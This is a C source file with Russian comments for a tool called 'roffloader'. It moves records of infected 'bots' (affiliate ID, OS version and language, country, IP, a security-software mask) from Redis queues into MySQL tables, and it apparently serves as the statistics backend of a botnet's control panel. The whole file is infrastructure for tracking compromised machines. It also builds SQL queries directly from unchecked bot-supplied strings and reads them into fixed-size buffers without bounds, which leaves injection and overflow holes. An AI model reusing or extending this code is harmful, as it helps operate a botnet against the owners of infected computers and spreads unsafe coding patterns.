#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <mysql/mysql.h>
#include <mysql/mysqld_error.h>

#include "../../shared_code/platform.h"
#include "../../shared_code/types.h"
#include "../../shared_code/config.h"
#include "../../shared_code/utils.h"
#include "../../shared_code/timing.h"

#include "redis_config.h"

#define MAJOR_ROFFLOADER_VERSION 0
#define MINOR_ROFFLOADER_VERSION 86

#define BOTID_SIZE 64

typedef struct _global_config
{
	char* lockFile;		// Путь к файлу блокировки.
	char* redisHost;
	uint16_t redisPort;
	char* mysqlSock;		// Сокет для работы с MySQL.
	char* mysqlHost;		// Хост СУБД.
	uint16_t mysqlPort;		// Порт СУБД.
	char* mysqlName;		// Имя БД.
	char* mysqlUser;		// Имя пользователя для доступа к БД
	char* mysqlPassword;		// Пароль пользователя
	uint32_t dataCount;		//  Количество записей запрашиваемых из REDIS-а за один раз
} global_config_t;

global_config_t gGlobalConfig;

#define USE_PERF_ 0

#if USE_PERF == 1

#define DECL_PERF unsigned long long tsc
#define BEGIN_PERF tsc = hardclock()
#define END_PERF(msg) printf("%s: %lld ms\n", msg, (hardclock() - tsc) / 1000)

#else

#define DECL_PERF
#define BEGIN_PERF
#define END_PERF(msg)

#endif // USE_PERF


int db_connect(MYSQL* pMysql)
{
	my_bool reconnect = 1;
	mysql_options(pMysql, MYSQL_OPT_RECONNECT, &reconnect);
	if (mysql_real_connect(pMysql, gGlobalConfig.mysqlHost, gGlobalConfig.mysqlUser, gGlobalConfig.mysqlPassword, gGlobalConfig.mysqlName, gGlobalConfig.mysqlPort, gGlobalConfig.mysqlSock, CLIENT_MULTI_STATEMENTS) == NULL) {
		printf("Can't connect to database %s (%s:%d). MYSQL error: %s\n\n", gGlobalConfig.mysqlName, gGlobalConfig.mysqlHost, gGlobalConfig.mysqlPort, mysql_error(pMysql));
		return ERR_BAD;
	}
	return ERR_OK;
}

int db_query(MYSQL* pMysql, const char* query)
{
	int res;
	do {
		res = mysql_real_query(pMysql, query, (unsigned long)strlen(query));
		if (res == 0)
			return ERR_OK;
		break;	
	} while (1);
	
	printf("%s MySql error: %s\n\n", query, mysql_error(pMysql));
	return mysql_errno(pMysql);
}

void* handleConfigParameter(char* keyName, int* pValueType)
{
	void* pVal = NULL;

	if (gGlobalConfig.lockFile == 0 && strcmp(keyName, "lock_file") == 0) {
		pVal = (void*)&gGlobalConfig.lockFile; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.redisHost == 0 && strcmp(keyName, "redis_host") == 0) {
		pVal = (void*)&gGlobalConfig.redisHost; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "redis_port") == 0) {
		pVal = (void*)&gGlobalConfig.redisPort; *pValueType = TYPE_UINT16;
	}
	else if (gGlobalConfig.mysqlHost == 0 && strcmp(keyName, "mysql_host") == 0) {
		pVal = (void*)&gGlobalConfig.mysqlHost; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.mysqlSock == 0 && strcmp(keyName, "mysql_sock") == 0) {
		pVal = (void*)&gGlobalConfig.mysqlSock; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "mysql_port") == 0) {
		pVal = (void*)&gGlobalConfig.mysqlPort; *pValueType = TYPE_UINT16;
	}
	else if (gGlobalConfig.mysqlUser == 0 && strcmp(keyName, "mysql_user") == 0) {
		pVal = (void*)&gGlobalConfig.mysqlUser; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.mysqlPassword == 0 && strcmp(keyName, "mysql_pwd") == 0) {
		pVal = (void*)&gGlobalConfig.mysqlPassword; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.mysqlName == 0 && strcmp(keyName, "mysql_name") == 0) {
		pVal = (void*)&gGlobalConfig.mysqlName; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "data_count_per_redis_request") == 0) {
		pVal = (void*)&gGlobalConfig.dataCount; *pValueType = TYPE_UINT32;
	}
	
	return pVal;
}
#define CONF_PATH argv[1]

int main(int argc, char** argv, char** envs)
{
	int lockFile;
	char data[32];
	redisContext* redisCtx = NULL;
	redisReply* redisTses = NULL;
	uint32_t ts, currTimestamp;
	char query[1024];
	size_t i;
	int ret = ERR_BAD;
	MYSQL mysql;
	struct timeval timeout = {11, 0}; // 11 секунд
	DECL_PERF;

	if (argc < 2) {
		printf("roffloader v%u.%u\n\nUsage:\n   roffloader <config_file>\n\n", MAJOR_ROFFLOADER_VERSION, MINOR_ROFFLOADER_VERSION);
		exit(1);
	}

	memset(&gGlobalConfig, 0, sizeof(global_config_t));

	if (config_load(CONF_PATH, line_parser_conf, line_parser_conf_done, handleConfigParameter) != 0) {
		printf("Cannot read config %s\n\n", CONF_PATH);
		exit(1);
	}

	lockFile = open(gGlobalConfig.lockFile, O_RDWR | O_CREAT, 0640);
	if (lockFile < 0) {
		printf("Cannot open/create LOCK file: %s\n\n", gGlobalConfig.lockFile);
		exit(1); // cannot open
	}
	if (lockf(lockFile, F_TLOCK, 0) < 0) {
		printf("Another instance of roffloader is running\n");
		exit(0); // can not lock
	}
	sprintf(data, "%d", getpid());
	write(lockFile, data, strlen(data)); /* record pid to lockfile */

	if (mysql_library_init(0, 0, 0) != 0) {
		printf("Can't initialize MySQL library\n\n");
		exit(1);
	}

	mysql_init(&mysql);

	if (db_connect(&mysql) != ERR_OK) {
		mysql_close(&mysql);
		exit(1);
	}

	redisCtx = redisConnectWithTimeout(gGlobalConfig.redisHost, gGlobalConfig.redisPort, timeout);
	if (redisCtx->err) {
		printf("Can't connect to REDIS (%s:%u)\n\n", gGlobalConfig.redisHost, gGlobalConfig.redisPort);
		exit(1);
	}

	currTimestamp = (uint32_t)time(NULL);
	ts = currTimestamp / TS_STEP;

	do {
		uint32_t currTs;

		// Получаем общее количество квантов.
		snprintf(query, 1024, "LRANGE ltss 0 -1");
		redisTses = redisCommand(redisCtx, query);
		if (redisTses == NULL) {
			printf("redis error\n\n");
			break;
		}

		printf("! Total time slices: %lu\n", redisTses->elements);

		// Перебираем все кванты.
		for (i = 0; i < redisTses->elements; ++i) {
			uint32_t n, listSize, iterCount;
			redisReply* redisReply = NULL;
		
			// Получаем первый в списке квант.
			snprintf(query, 1024, "LINDEX ltss 0");
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				printf("NULL REDIS reply: %s\n\n", query);
				break;
			}

			currTs = (uint32_t)atoll(redisReply->str);
			freeReplyObject(redisReply);
			
			// Проверяем является ли он текущим активным квантом, и если является, то завершаем перебор и выходим из цикла.
			if (currTs >= ts) {
				ret = ERR_OK;
				printf("! Terminating on %u time slice\n", currTs);
				break;
			}

			// Получаем количество элементов для текущего кванта.
			snprintf(query, 1024, "LLEN bh:%u", currTs);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				printf("NULL REDIS reply: %s\n\n", query);
				break;
			}
			listSize = (uint32_t)redisReply->integer;
			freeReplyObject(redisReply);

			printf("! Processing %u time slice... ", currTs);
			fflush(stdout);

			ret = ERR_OK;

			// Вычисляем количество итераций для выборки данных.
			iterCount = listSize / gGlobalConfig.dataCount + ((listSize % gGlobalConfig.dataCount) ? 1 : 0);
			//BEGIN_PERF;
			for (n = 0; n < iterCount; ++n) {
				size_t k;
				MYSQL_RES* mysqlResult = NULL;
				MYSQL_ROW mysqlRow;
				int mysqlErr, numRows, nValues;
				uint64_t iid;
				uint32_t dayTm;
				uint32_t affId;
				uint32_t subId;
				uint32_t ver, dbVer;
				uint32_t osVer, dbOsVer;
				uint32_t osLang, dbOsLang;
				uint32_t ip, dbIp;
				uint32_t dtf, dtl;
				uint32_t isNewBot;
				uint64_t hips, dbHips;
				char uniqid[BOTID_SIZE + 1];
				char countryCode[3], dbCC[3];

				// Получаем список данных из указанного диапазона.
				snprintf(query, 1024, "LRANGE bh:%u 0 %u", currTs, gGlobalConfig.dataCount - 1);
				redisReply = redisCommand(redisCtx, query);
				if (redisReply == NULL) {
					ret = ERR_BAD;
					printf("NULL REDIS reply: %s\n\n", query);
					break;
				}

				for (k = 0; k < redisReply->elements; ++k) {
					char* ptr = redisReply->element[k]->str;
					for ( ; *ptr != '\0'; ++ptr) {
						if (*ptr == ':') {
							*ptr = ' ';
						}
					}
#if defined(__LP64__)
					nValues = sscanf(redisReply->element[k]->str, "%lu %u %s %u %u %u %u %u %u %u %lu %s %u", &iid, &isNewBot, uniqid, &dtf, &dtl, &affId, &subId, &ver, &osVer, &osLang, &hips, countryCode, &ip);
#else
					nValues = sscanf(redisReply->element[k]->str, "%llu %u %s %u %u %u %u %u %u %u %llu %s %u", &iid, &isNewBot, uniqid, &dtf, &dtl, &affId, &subId, &ver, &osVer, &osLang, &hips, countryCode, &ip);
#endif // __LP64__
					if (nValues != 13) {
						// Некорректные данные о боте, просто игнорируем эту запись и переходи к следующей.
						printf("Incorrect bot data: %s\n\n", redisReply->element[k]->str);
						continue;
					}

					dayTm = (dtl / 86400) * 86400;

					if (isNewBot) {
						// Делаем инсерты во ве таблицы.
#if defined(__LP64__)
						snprintf(query, 1024, "INSERT INTO bots(id,uniqid,aff_id,sub_id,dtf,bot_ver,os_ver,os_lang,cc,hips_mask,ip) VALUES(%lu,'%.64s',%u,%u,%u,%u,%u,%u,'%.2s',%lu,%u);"
									 "INSERT INTO bots_activities(bot_id, ip, conn_dt, day) VALUES(%lu,%u,%u,%u);",
#else
						snprintf(query, 1024, "INSERT INTO bots(id,uniqid,aff_id,sub_id,dtf,bot_ver,os_ver,os_lang,cc,hips_mask,ip) VALUES(%llu,'%.64s',%u,%u,%u,%u,%u,%u,'%.2s',%llu,%u);"
									 "INSERT INTO bots_activities(bot_id, ip, conn_dt, day) VALUES(%llu,%u,%u,%u);",
#endif // __LP64__
							iid, uniqid, affId, subId, dtf, ver, osVer, osLang, countryCode, hips, ip,
							iid, ip, dtl, dayTm);

						BEGIN_PERF;
						mysqlErr = db_query(&mysql, query);
						END_PERF(query);
//						if (mysqlErr != ERR_OK) {
//							ret = ERR_BAD;
//							break;
//						}

						// Обрабатываем каждый результат.
						do {
							/* more results? -1 = no, >0 = error, 0 = yes (keep looping) */
							mysqlErr = mysql_next_result(&mysql);
						} while (mysqlErr == 0);
					}
					else {
#if defined(__LP64__)
						snprintf(query, 1024, "SELECT bot_ver,os_ver,os_lang,cc,hips_mask,ip FROM bots WHERE id=%lu", iid);
#else
						snprintf(query, 1024, "SELECT bot_ver,os_ver,os_lang,cc,hips_mask,ip FROM bots WHERE id=%llu", iid);

#endif // __LP64__
						BEGIN_PERF;
						mysqlErr = db_query(&mysql, query);
						END_PERF(query);
						if (mysqlErr != ERR_OK) {
							ret = ERR_BAD;
							break;
						}

						mysqlResult = mysql_store_result(&mysql);
						if (mysqlResult != NULL) {
							numRows = mysql_num_rows(mysqlResult);
							if (numRows > 0) {
								mysqlRow = mysql_fetch_row(mysqlResult);
								dbVer = (uint32_t)atoi(mysqlRow[0]);
								dbOsVer = (uint32_t)atoi(mysqlRow[1]);
								dbOsLang = (uint32_t)atoi(mysqlRow[2]);
								strncpy(dbCC, mysqlRow[3], 2);
								dbHips = strtoull(mysqlRow[4], NULL, 10);
								dbIp = (uint32_t)strtoull(mysqlRow[5], NULL, 10);
								mysql_free_result(mysqlResult);

								if (ver != dbVer || osVer != dbOsVer ||  osLang != dbOsLang || ip != dbIp || hips != dbHips || memcmp(countryCode, dbCC, 2) != 0) {
#if defined(__LP64__)
									snprintf(query, 1024, "UPDATE bots SET bot_ver=%u,os_ver=%u,os_lang=%u,cc='%.2s',hips_mask=%lu,ip=%u WHERE id=%lu;", 
#else
									snprintf(query, 1024, "UPDATE bots SET bot_ver=%u,os_ver=%u,os_lang=%u,cc='%.2s',hips_mask=%llu,ip=%u WHERE id=%llu;", 

#endif // __LP64__
										ver, osVer, osLang, countryCode, hips, ip, iid);
									BEGIN_PERF;
									mysqlErr = db_query(&mysql, query);
									END_PERF(query);
									if (mysqlErr != ERR_OK) {
										ret = ERR_BAD;
										break;
									}
								}
							}
							else {
								mysql_free_result(mysqlResult);
							}
						}

#if defined(__LP64__)
						snprintf(query, 1024, "INSERT INTO bots_activities(bot_id,ip,conn_dt,day) VALUES(%lu,%u,%u,%u)", 
#else
						snprintf(query, 1024, "INSERT INTO bots_activities(bot_id,ip,conn_dt,day) VALUES(%llu,%u,%u,%u)", 

#endif // __LP64__
							iid, ip, dtl, dayTm);
						BEGIN_PERF;
						mysqlErr = db_query(&mysql, query);
						END_PERF(query);
						if (mysqlErr != ERR_OK) {
							ret = ERR_BAD;
							break;
						}
					}
				}

				if (k < redisReply->elements) {
					freeReplyObject(redisReply);
					break;
				}

				freeReplyObject(redisReply);

				snprintf(query, 1024, "LTRIM bh:%u %u %u", currTs, gGlobalConfig.dataCount, listSize);
				redisReply = redisCommand(redisCtx, query);
				if (redisReply == NULL) {
					ret = ERR_BAD;
					printf("NULL REDIS reply: %s\n\n", query);
					break;
				}

				listSize -= gGlobalConfig.dataCount;
				
				freeReplyObject(redisReply);
			}
//			END_PERF("%lu ms\n");
			printf("OK\n");

			if (ret != ERR_OK) {
				break;
			}


			snprintf(query, 1024, "LPOP ltss");
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				continue;
			}
			freeReplyObject(redisReply);
		}	
	
		freeReplyObject(redisTses);
	} while (0);

	redisFree(redisCtx);

	mysql_close(&mysql);
	mysql_library_end();

	unlink(gGlobalConfig.lockFile);

	free(gGlobalConfig.lockFile);
	free(gGlobalConfig.redisHost);
	free(gGlobalConfig.mysqlSock);
	free(gGlobalConfig.mysqlHost);
	free(gGlobalConfig.mysqlName);
	free(gGlobalConfig.mysqlUser);
	free(gGlobalConfig.mysqlPassword);

	return 0;
}
